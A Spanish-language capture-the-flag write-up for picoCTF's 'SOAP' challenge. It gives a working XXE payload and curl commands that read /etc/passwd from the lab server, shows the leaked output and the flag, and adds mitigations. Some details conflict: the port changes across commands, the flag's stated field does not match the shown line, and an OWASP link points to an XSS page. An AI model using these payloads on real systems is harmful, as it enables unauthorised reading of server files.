# SOAP

Description


The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?
Web Portal http://saturn.picoctf.net:52649

hint: XML external entity Injection


## Descripción

Aplicación web vulnerable a XXE (XML External Entity). El objetivo es leer el archivo local `/etc/passwd` explotando una entidad XML externa y obtener su contenido desde el endpoint de la aplicación.

URL del reto: `http://saturn.picoctf.net:51320/data` (POST con payload XML)

## Solución

La aplicación parsea XML enviado por el cliente y no deshabilita las entidades externas, por lo que podemos inyectar una DOCTYPE que defina una entidad `xxe` apuntando a `file:///etc/passwd` y luego usar esa entidad en el body para que el parser la reemplace con el contenido del fichero.

### Importante: La bandera es dinámica

**Cada vez que se reinicia la instancia, la bandera cambia.** La metodología (XXE + `/etc/passwd`) es siempre la misma, pero el valor exact de la bandera varía entre reinicios. Por lo tanto, el objetivo es dominar la técnica XXE, no memorizar una bandera específica.

Ejemplo de DOCTYPE / payload (válido para enviar con Burp o `curl`):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<data><ID>&xxe;</ID></data>
```

### Opción 1: Usando heredoc (más seguro para caracteres especiales)

```bash
curl -i -X POST http://saturn.picoctf.net:51320/data \
  -H 'Content-Type: application/xml' \
  --data-binary @- <<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<data><ID>&xxe;</ID></data>
XML
```

### Opción 2: Usando `-d` con comillas simples (más conciso)

```bash
curl -s -X POST http://saturn.picoctf.net:62028/data \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><data><ID>&xxe;</ID></data>'
```

Ambas opciones producen el mismo resultado; elige la que prefieras según tu contexto.

Salida esperada: el servidor devuelve el contenido de `/etc/passwd` (o lo inserta en la respuesta XML/HTML).

**Salida real obtenida** (verificada contra `http://saturn.picoctf.net:51320/data` el 11 de mayo de 2026):

```
HTTP/1.1 200 OK
Server: Werkzeug/2.3.6 Python/3.8.10
Content-Type: text/html; charset=utf-8
Content-Length: 1023

Invalid ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
... (más entradas del sistema)
flask:x:999:999::/app:/bin/sh
picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1ty_e79a75d4}
```

**Bandera encontrada (instancia anterior)**: `picoCTF{XML_3xtern@l_3nt1ty_e79a75d4}`

**Nota**: Esta bandera es de una instancia anterior. Cada reinicio de la instancia genera una **bandera nueva**, pero la estructura y método permanecen iguales.

La bandera está incrustada en el campo UID del usuario `picoctf` dentro del archivo `/etc/passwd`, lo que demuestra cómo XXE permite extraer información sensible del sistema de archivos.

## Notas y mitigaciones

- XXE permite leer archivos locales, realizar solicitudes de red desde el servidor y, en casos extremos, ejecutar código remoto si el parser lo permite. Es una vulnerabilidad grave.
- En este reto, la aplicación devuelve mensajes `Invalid ID:` seguidos del contenido de la entidad XML expandida, lo que permite extraer datos fácilmente.
- La bandera se genera dinámicamente en cada reinicio de la instancia, pero siempre se encuentra en el mismo lugar: el campo UID del usuario `picoctf` en `/etc/passwd`.
- Mitigación: deshabilitar la resolución de entidades externas en el parser XML (p. ej. en Python lxml/configurar el parser para no resolver entidades), validar/filtrar el XML de entrada y usar alternativas seguras (JSON cuando sea posible).
- Otras rutas probadas pero no accesibles: `/flag`, `/flag.txt`, `/root/flag.txt`, `/tmp/flag`, `/home/picoctf/flag` — la bandera estaba efectivamente codificada en el campo UID del usuario `picoctf` en `/etc/passwd`.

## Referencias

- OWASP XXE: https://owasp.org/www-community/attacks/xss/ (XML External Entity)
- PortSwigger XXE Guide: https://portswigger.net/web-security/xxe
- XXE Payloads (PayloadsAllTheThings): https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
